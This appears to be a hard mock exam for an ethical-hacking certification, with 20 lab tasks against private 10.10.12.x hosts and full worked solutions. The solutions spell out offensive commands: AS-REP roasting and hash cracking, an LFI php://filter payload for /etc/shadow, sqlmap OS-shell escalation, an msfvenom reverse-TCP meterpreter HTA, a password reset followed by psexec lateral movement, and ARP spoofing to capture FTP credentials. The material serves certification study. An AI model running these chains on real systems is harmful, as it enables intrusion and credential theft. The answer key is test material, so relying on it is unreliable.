# Mock Exam 3 (Hard) — 20 Questions, 6 Hours

> Sit for 6 hours. No solutions until the end. Mark your answers in a separate text file.
> **Answer format matters — copy verbatim from tool output.**

**Targets in this mock:** `10.10.12.10`, `10.10.12.22`, `10.10.12.33`, `10.10.12.44`, `10.10.12.55`, `10.10.12.77`, `10.10.12.88`

**Legend:** 🟢 easy · 🟡 medium · 🔴 hard

This is the HARD mock — evasion, longer chains, less hand-holding, trickier format requirements. Several questions deliberately require you to pick between 3–4 possible tools and know which one actually works here. Expect to finish tight on time.

---

## Question 1 (10.10.12.10)
**Domain:** 02 Scanning | **Difficulty:** 🟡 | **Time est:** 10 min

`10.10.12.10` drops inbound ICMP and TCP SYN on most ports. Use an evasion technique to identify what ports are open. How many TCP ports are open?

**Answer format:** integer

---

## Question 2 (10.10.12.10)
**Domain:** 02 Scanning | **Difficulty:** 🟡 | **Time est:** 8 min

On `10.10.12.10`, one of the open ports hosts an HTTPS service with an expired SSL certificate. What is the Common Name (CN) on the certificate?

**Answer format:** CN value (e.g. `mail.example.local`)

---

## Question 3 (10.10.12.10)
**Domain:** 03 Enumeration | **Difficulty:** 🔴 | **Time est:** 15 min

Use `dig` to perform a DNS zone transfer against `10.10.12.10` for domain `ceh.local`. How many A records are in the zone?

**Answer format:** integer

---

## Question 4 (10.10.12.22)
**Domain:** 03 Enumeration | **Difficulty:** 🟡 | **Time est:** 12 min

Enumerate LDAP on `10.10.12.22` with an anonymous bind. What is the domain's naming context (defaultNamingContext)?

**Answer format:** DN (e.g. `DC=corp,DC=local`)

---

## Question 5 (10.10.12.22)
**Domain:** 03 Enumeration | **Difficulty:** 🔴 | **Time est:** 15 min

Use `impacket-GetNPUsers` against the domain from Q4 to AS-REP roast any users with Kerberos pre-auth disabled. Which user(s) are roastable?

**Answer format:** comma-separated usernames

---

## Question 6 (10.10.12.22)
**Domain:** 05 System Hacking / 18 Crypto | **Difficulty:** 🔴 | **Time est:** 20 min

Crack the AS-REP hash from Q5 with `hashcat` mode 18200 using `rockyou.txt`. What is the user's password?

**Answer format:** cleartext string

---

## Question 7 (10.10.12.22) — CHAIN
**Domain:** 05 System Hacking | **Difficulty:** 🔴 | **Time est:** 25 min

Using the credential from Q6, enumerate the domain with `crackmapexec` or `bloodhound-python`. Find a user that is a member of `Account Operators`. What is that user's `sAMAccountName`?

**Answer format:** username

---

## Question 8 (10.10.12.33)
**Domain:** 12 Web Apps | **Difficulty:** 🟡 | **Time est:** 15 min

A site at `http://10.10.12.33/` uses parameter `?page=home`. Identify and exploit the LFI. Read the contents of `/etc/shadow`. Under what encoding do you need to wrap the filter to read it as base64? (Hint: `php://filter`). What is the root user's hash algorithm marker? (e.g. `$6$`, `$y$`, `$1$`)

**Answer format:** algorithm marker including `$` signs (e.g. `$6$`)

---

## Question 9 (10.10.12.33)
**Domain:** 13 SQL Injection | **Difficulty:** 🔴 | **Time est:** 25 min

`http://10.10.12.33/api/product?id=1` is a blind boolean-based SQLi (no error output, no data in response). Use sqlmap with `--technique=B` and `--level=5 --risk=3`. What is the version of MySQL running?

**Answer format:** full version string (e.g. `5.7.33-log`)

---

## Question 10 (10.10.12.33)
**Domain:** 13 SQL Injection | **Difficulty:** 🔴 | **Time est:** 20 min

From the same endpoint, escalate to OS shell (`--os-shell`). What is the value of `/etc/hostname`?

**Answer format:** hostname string

---

## Question 11 (10.10.12.44)
**Domain:** 07 Sniffing / 10 Session Hijacking | **Difficulty:** 🔴 | **Time est:** 20 min

A large pcap `session.pcap` is provided. It contains a TCP session where a cookie was set during login. What is the value of the `PHPSESSID` cookie issued by the server?

**Answer format:** cookie value string

---

## Question 12 (10.10.12.44)
**Domain:** 07 Sniffing | **Difficulty:** 🔴 | **Time est:** 15 min

The same pcap has a TLS session. The server's private key `server.key` is provided. Decrypt the TLS stream in Wireshark and find the HTTP Basic Auth header inside. What is the decoded `user:pass` pair?

**Answer format:** `user:pass`

---

## Question 13 (10.10.12.55)
**Domain:** 14 Wireless | **Difficulty:** 🔴 | **Time est:** 20 min

A WPA2-PSK handshake for SSID `GuestWiFi` is provided as `guest.hccapx`. The wordlist `rockyou.txt` does NOT contain the password. Use `hashcat` with a mask attack: the password is exactly 8 characters, format `Guest` + 3 digits. What is the passphrase?

**Answer format:** passphrase string

---

## Question 14 (10.10.12.77)
**Domain:** 17 Cloud | **Difficulty:** 🔴 | **Time est:** 20 min

A MinIO/S3 service on `10.10.12.77:9000` has an anonymously-listable bucket `backups`. Inside is an encrypted archive `db.tar.gz.enc` and a README hinting the key is derived via `openssl enc -aes-256-cbc -pass pass:<something>`. A file `hint.txt` in the bucket says "my dog's name is Rex". Brute the derivation? No — try the literal hint. Decrypt and extract. What is the name of the sql dump file inside?

**Answer format:** filename with extension

---

## Question 15 (10.10.12.88)
**Domain:** 06 Malware | **Difficulty:** 🔴 | **Time est:** 20 min

A suspicious Windows binary `sample.exe` is provided. Run `strings` and identify the C2 domain it connects to. Also run `pestudio` or `PEview` — or just `exiftool sample.exe`. What is the C2 domain?

**Answer format:** FQDN (e.g. `evil.badguy.com`)

---

## Question 16 (10.10.12.88)
**Domain:** 08 Social Engineering | **Difficulty:** 🟡 | **Time est:** 15 min

Craft a phishing payload with `msfvenom` — a macro-enabled Word doc (`.hta` also acceptable) that executes a reverse TCP meterpreter. When the target `10.10.12.88` executes it (simulated), catch the callback. What is the hostname of `10.10.12.88`?

**Answer format:** hostname string (from `sysinfo` in meterpreter)

---

## Question 17 (file)
**Domain:** 18 Cryptography | **Difficulty:** 🔴 | **Time est:** 20 min

A file `cipher.txt` contains a string encrypted with RSA. The public key `pub.pem` is provided with a suspiciously small modulus (256 bits). Factor `n` with `factordb` or `RsaCtfTool`, derive `d`, decrypt the ciphertext. What is the cleartext?

**Answer format:** plaintext string

---

## Question 18 (16 IoT/OT)
**Domain:** 16 IoT/OT | **Difficulty:** 🔴 | **Time est:** 20 min

A firmware image `iot-fw.bin` is provided. Use `binwalk -e` to extract it, then find the hardcoded default root password in `/etc/shadow` or `/etc/passwd` of the extracted filesystem. Crack it with `john`. What is the root password?

**Answer format:** cleartext string

---

## Question 19 (10.10.12.22 → 10.10.12.33) — CHAIN
**Domain:** Multi (05 System Hacking → Lateral Movement) | **Difficulty:** 🔴 | **Time est:** 35 min

Using the Account Operators user from Q7, reset another domain user's password via `rpcclient`, then use those creds to `psexec.py` (impacket) into `10.10.12.33` (which is domain-joined). Read `C:\Users\<victim>\Documents\creds.txt`. What is the content?

**Answer format:** string verbatim

---

## Question 20 (10.10.12.10 → 10.10.12.88) — CHAIN
**Domain:** Multi (07 Sniffing → 05 System Hacking → 09 DoS) | **Difficulty:** 🔴 | **Time est:** 40 min

Using ARP spoofing with `ettercap` or `bettercap`, intercept traffic between `10.10.12.10` and `10.10.12.88`. Capture an FTP password sent between them. Log into the FTP server on `10.10.12.88`, download the file `payload.zip` (password-protected), crack the zip password with `fcrackzip` or `john`, and read `flag.txt` inside. What is the flag?

**Answer format:** flag string verbatim

---

---

# Solutions

> Don't read below until you have finished all 20 questions and marked your answers.

---

## Q1 Solution
**Steps:**
1. ICMP blocked → add `-Pn`. SYN filtered → try ACK scan or full connect:
2. `sudo nmap -sA -p- -Pn 10.10.12.10` ← ACK scan identifies filtered vs unfiltered.
3. `nmap -sT -p- -Pn -T4 10.10.12.10` ← full TCP connect, bypasses SYN filters.
4. Try source port evasion: `sudo nmap -sS -Pn --source-port 53 10.10.12.10`
5. Try fragmentation: `sudo nmap -sS -f -Pn 10.10.12.10`
6. Count `open` results.

**Answer:** integer

**Gotcha:** 
- `-sT` (connect scan) is the right call when SYN is filtered but full handshakes pass.
- `-sA` won't tell you "open" vs "closed" — only "filtered" vs "unfiltered". Don't confuse.

---

## Q2 Solution
**Steps:**
1. `nmap -p- -sV --script ssl-cert 10.10.12.10` ← picks up HTTPS on non-standard ports.
2. Or per port: `openssl s_client -connect 10.10.12.10:<port> -showcerts </dev/null | openssl x509 -noout -subject`  ← [openssl](../../tools/openssl.md)
3. Read `CN=`.

**Answer:** CN value

**Gotcha:** expired doesn't block TLS — openssl will still print the cert, just warn. Add `-servername <host>` if SNI is needed.

---

## Q3 Solution
**Steps:**
1. `dig axfr ceh.local @10.10.12.10` ← [dig](../../tools/dig.md)
2. Or: `dnsrecon -d ceh.local -n 10.10.12.10 -t axfr` ← [dnsrecon](../../tools/dnsrecon.md)
3. Count A records: `dig axfr ceh.local @10.10.12.10 | awk '$4=="A"' | wc -l`

**Answer:** integer

**Gotcha:** AXFR output includes SOA, NS, MX, CNAME lines — filter to `A` only. Don't count `AAAA` (IPv6).

---

## Q4 Solution
**Steps:**
1. `ldapsearch -x -H ldap://10.10.12.22 -s base namingcontexts`
2. Or: `nmap -p 389 --script ldap-rootdse 10.10.12.22`
3. Read `defaultNamingContext`.

**Answer:** DN string (e.g. `DC=ceh,DC=local`)

**Gotcha:** anonymous bind = `-x`. If the server refuses, try `-D '' -w ''` or use a discovered user.

---

## Q5 Solution
**Steps:**
1. Need user list first — either from Q4 LDAP enum (`ldapsearch ... "(objectClass=user)" sAMAccountName`) or from Q3 subdomain dump.
2. `impacket-GetNPUsers ceh.local/ -no-pass -usersfile users.txt -dc-ip 10.10.12.22` ← [impacket](../../tools/impacket.md)
3. Or authenticated: `impacket-GetNPUsers ceh.local/<user>:<pass> -request -dc-ip 10.10.12.22`
4. Users with pre-auth disabled return a `$krb5asrep$23$...` hash.

**Answer:** comma-separated usernames

**Gotcha:** `-no-pass` + `-usersfile` lets you roast without any credentials. This is the #1 AD starting point in hard CEH boxes.

---

## Q6 Solution
**Steps:**
1. Save the `$krb5asrep$23$...` hash to `asrep.txt`.
2. `hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt`
3. `hashcat -m 18200 asrep.txt --show`

**Answer:** cleartext

**Gotcha:** mode 18200, NOT 13100 (that's TGS / Kerberoasting). Memorize: 18200 = AS-REP, 13100 = TGS-REP.

---

## Q7 Solution
**Steps:**
1. `crackmapexec ldap 10.10.12.22 -u <user> -p <pass> --groups` ← [cme](../../tools/crackmapexec.md)
2. Or: `bloodhound-python -u <user> -p <pass> -d ceh.local -ns 10.10.12.22 -c all`, then import to BloodHound GUI, query "Account Operators".
3. Or: `ldapsearch -x -H ldap://10.10.12.22 -D '<user>@ceh.local' -w '<pass>' -b 'DC=ceh,DC=local' "(memberOf=CN=Account Operators,CN=Builtin,DC=ceh,DC=local)" sAMAccountName`

**Answer:** username

**Gotcha:** Account Operators can reset passwords of non-privileged users — big privesc primitive. Note the exact sAMAccountName, not display name.

---

## Q8 Solution
**Steps:**
1. Test LFI: `curl "http://10.10.12.33/?page=/etc/passwd"` — if blocked, PHP wrappers:
2. `curl "http://10.10.12.33/?page=php://filter/convert.base64-encode/resource=/etc/shadow"`
3. Decode: `echo <base64> | base64 -d`
4. Read first line for root.

**Answer:** algorithm marker (e.g. `$6$` for sha512crypt, `$y$` for yescrypt, `$1$` for md5crypt)

**Gotcha:** `/etc/shadow` is usually 0640 root:shadow — normal LFI (as www-data) can't read it directly. The `php://filter` trick works only if the PHP process has the right privileges; in lab boxes it often does.

---

## Q9 Solution
**Steps:**
1. `sqlmap -u "http://10.10.12.33/api/product?id=1" --technique=B --level=5 --risk=3 --batch --banner`
2. `--banner` prints the DB version.
3. For blind boolean, expect slow — 5–15 min per query.

**Answer:** MySQL version string

**Gotcha:** 
- `--technique=B` forces boolean-based only, faster than default which probes all five.
- Use `--threads=5` to parallelize.
- If sqlmap gives up, add `--prefix "'"` `--suffix "-- -"` to hint the injection context.

---

## Q10 Solution
**Steps:**
1. `sqlmap -u "http://10.10.12.33/api/product?id=1" --technique=B --level=5 --risk=3 --batch --os-shell`
2. sqlmap uploads a stager, you get a pseudo-shell.
3. `cat /etc/hostname`

**Answer:** hostname string

**Gotcha:** `--os-shell` requires MySQL `FILE` privilege and a writable webroot. If it fails, fall back to `INTO OUTFILE` manually into the docroot.

---

## Q11 Solution
**Steps:**
1. Wireshark: `http.set_cookie`
2. Or filter: `http.cookie contains "PHPSESSID"`
3. Find `Set-Cookie: PHPSESSID=...`
4. Or CLI: `tcpdump -r session.pcap -A | grep -i 'set-cookie'`

**Answer:** cookie value

**Gotcha:** multiple Set-Cookie headers may exist — the question wants the SERVER-issued one, not what the client sends back. Filter on `http.response`.

---

## Q12 Solution
**Steps:**
1. Wireshark → Edit → Preferences → Protocols → TLS → RSA keys list → add `server.key` with IP, port, protocol=http.
2. Reload pcap. Right-click a TLS stream → Follow → HTTP Stream.
3. Find `Authorization: Basic <base64>`.
4. `echo <base64> | base64 -d`

**Answer:** `user:pass`

**Gotcha:** 
- Decryption with RSA key only works if NO PFS ciphers (no DHE/ECDHE) were used. If the handshake used ECDHE, you need TLS session keys (SSLKEYLOGFILE), not the RSA private key.
- If decryption fails, the pcap is probably ECDHE — expect the exam to give you a cipher that works with the RSA key.

---

## Q13 Solution
**Steps:**
1. `hashcat -m 22000 guest.hccapx -a 3 Guest?d?d?d`
2. `-a 3` = mask attack. `?d` = digit.
3. If the file is `.hccapx` (old format), use `-m 2500` instead of 22000.
4. `hashcat -m 2500 guest.hccapx --show`

**Answer:** `Guest<ddd>` (e.g. `Guest123`)

**Gotcha:** 
- `.hccapx` = mode 2500. `.hc22000` = mode 22000. Check the file extension.
- `?d?d?d` is exactly 3 digits. `?d?d?d?d` is 4 — don't add an extra.

---

## Q14 Solution
**Steps:**
1. `aws --endpoint-url http://10.10.12.77:9000 s3 ls s3://backups --no-sign-request`
2. Download: `aws --endpoint-url http://10.10.12.77:9000 s3 cp s3://backups/db.tar.gz.enc . --no-sign-request`
3. `openssl enc -d -aes-256-cbc -in db.tar.gz.enc -out db.tar.gz -pass pass:Rex` ← [openssl](../../tools/openssl.md)
4. `tar -tzf db.tar.gz` → list contents.

**Answer:** sql dump filename (e.g. `dump.sql`)

**Gotcha:** 
- New openssl defaults to `-pbkdf2` — if decryption fails with "bad magic", add `-md md5` (legacy default).
- "Rex" not "rex" — test both casings.

---

## Q15 Solution
**Steps:**
1. `strings sample.exe | grep -Ei 'http|\.com|\.net|\.org'` — look for suspicious domain.
2. `exiftool sample.exe` ← [exiftool](../../tools/exiftool.md)
3. Confirm with `strings -el sample.exe` (wide chars — Windows often stores strings as UTF-16).

**Answer:** FQDN

**Gotcha:** `-el` (16-bit little-endian) catches Unicode strings that default `strings` misses. Malware often hides C2 in UTF-16 string tables.

---

## Q16 Solution
**Steps:**
1. `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f hta-psh -o evil.hta` ← [msfvenom](../../tools/msfvenom.md)
2. `msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <ip>; set LPORT 4444; run"`
3. Deliver hta (simulated click).
4. In meterpreter: `sysinfo` → read `Computer :` line.

**Answer:** hostname

**Gotcha:** `sysinfo` returns the NetBIOS name which may differ from FQDN. The question asks "hostname" — NetBIOS name is safest.

---

## Q17 Solution
**Steps:**
1. `openssl rsa -pubin -in pub.pem -text -noout` → read `n` and `e`.
2. Factor `n` via http://factordb.com (lookup) or `RsaCtfTool --publickey pub.pem --uncipherfile cipher.txt`
3. Or manually with Python: compute `phi=(p-1)*(q-1)`, `d=pow(e,-1,phi)`, `m=pow(c,d,n)`, then `long_to_bytes(m)`.

**Answer:** plaintext

**Gotcha:** 256-bit modulus = factorable in seconds via factordb. 512-bit still doable with cado-nfs. 1024+ = not in exam scope.

---

## Q18 Solution
**Steps:**
1. `binwalk -e iot-fw.bin` ← [binwalk](../../tools/binwalk.md)
2. `find _iot-fw.bin.extracted -name shadow`
3. `cat .../etc/shadow` — look for root line.
4. Save root hash: `echo 'root:<hash>::...' > root.shadow`
5. `john --wordlist=/usr/share/wordlists/rockyou.txt root.shadow` ← [john](../../tools/john.md)

**Answer:** cleartext

**Gotcha:** 
- If shadow only has `!` or `*` for root → no password set, look at `/etc/passwd` instead (old systems store hash there).
- Firmware often uses weak DES/MD5 — john cracks fast. SHA512 (`$6$`) may need rockyou + rules.

---

## Q19 Solution — CHAIN
**Steps:**
1. `rpcclient -U 'ceh.local\<acctop_user>%<pass>' 10.10.12.22`
2. `rpcclient> setuserinfo2 <victim> 23 NewP@ss123!`
3. `impacket-psexec 'ceh.local/<victim>:NewP@ss123!@10.10.12.33'` ← [impacket](../../tools/impacket.md)
4. `type C:\Users\<victim>\Documents\creds.txt`

**Answer:** string verbatim

**Gotcha:** 
- `setuserinfo2 ... 23 ...` level 23 is the full-encrypted password set — it's the right syntax for modern DCs.
- psexec.py drops a service — noisy. If it fails (AV), try `smbexec.py` or `wmiexec.py`.
- Account Operators CAN reset passwords of normal users but NOT domain admins. Verify victim isn't privileged first.

---

## Q20 Solution — CHAIN
**Steps:**
1. **ARP spoof:** `sudo bettercap -iface eth0` → `set arp.spoof.targets 10.10.12.10,10.10.12.88; arp.spoof on; net.sniff on` ← [bettercap](../../tools/bettercap.md)
2. Or: `sudo ettercap -T -M arp:remote /10.10.12.10// /10.10.12.88//` ← [ettercap](../../tools/ettercap.md)
3. **Capture FTP creds** (cleartext) — bettercap logs `[FTP] user:pass`.
4. **FTP login:** `ftp 10.10.12.88`, user/pass from step 3.
5. `get payload.zip`, `bye`.
6. **Crack zip:** `fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt payload.zip`
7. Or john: `zip2john payload.zip > zip.hash; john --wordlist=rockyou.txt zip.hash`
8. `unzip -P <pass> payload.zip`
9. `cat flag.txt`

**Answer:** flag string verbatim

**Gotcha:** 
- Enable IP forwarding: `echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward` — otherwise you drop the traffic (DoS instead of MitM).
- fcrackzip `-u` tries and verifies actual unzip — without it you get false positives from CRC collisions.
- If the zip uses AES encryption, fcrackzip fails silently — use john (`zip2john` handles both ZipCrypto and AES).

---

## End of Mock 3

**Expected score for ready candidates:** 13–17 / 20

**Expected completion time:** 5h30 – 6h (this mock is calibrated to the upper end).

If you hit 14+ on this one under time, you are ready for the real exam. Debrief per [`README.md`](README.md), then rest.
